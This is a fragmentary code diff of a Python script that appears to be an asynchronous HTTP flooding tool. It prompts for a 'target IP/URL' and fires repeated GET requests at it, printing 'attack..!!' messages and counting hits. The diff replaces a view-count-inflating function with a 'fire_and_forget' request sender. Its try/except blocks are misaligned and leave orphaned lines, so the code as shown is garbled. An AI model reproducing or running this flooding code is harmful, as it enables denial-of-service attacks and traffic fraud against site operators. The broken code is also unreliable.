@@ -33,26 +33,11 @@ _—_—_—_—_—_—_—_—_—_—_—_—_—_—_—_—_—_—_—_—
 """
 faded_text = fade.fire(logo)
 print(faded_text)
-socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-addr = (str(),int())
-ask = fade.pinkred("Enter the target IP/URL:")
-url = input(ask)
-async def increment_view_count(session):
+async def fire_and_forget(url, session, counter):
     try:
         async with session.get(url) as response:
-            if response.status == 200:
-                print("[+]  \033[32mRequest Sent  \033[33m" +url+"  \033[34mattack..!!  \033[0m")
-        else:
-                print("[!]  \033[96mRequest Sent  \033[32m" +url+"  \033[33mattack..!!  \033[0m")
-                print("[!]  \033[94mRequest Sent  \033[96m" +url+"  \033[37mattack..!!  \033[0m")
-    except aiohttp.ClientError as e:
-        print("[💥]  \033[34mAn error occurred:\033[0m", e)
-                
-def Factorial(n): # return factorial
-    result = 1
-    for i in range (1,n):
-        result = result * i
-    print("")
+            # You can add some minimal processing here if needed
+            pass
         counter.increment()
     except Exception as e:
         print(f"Error: {e}")
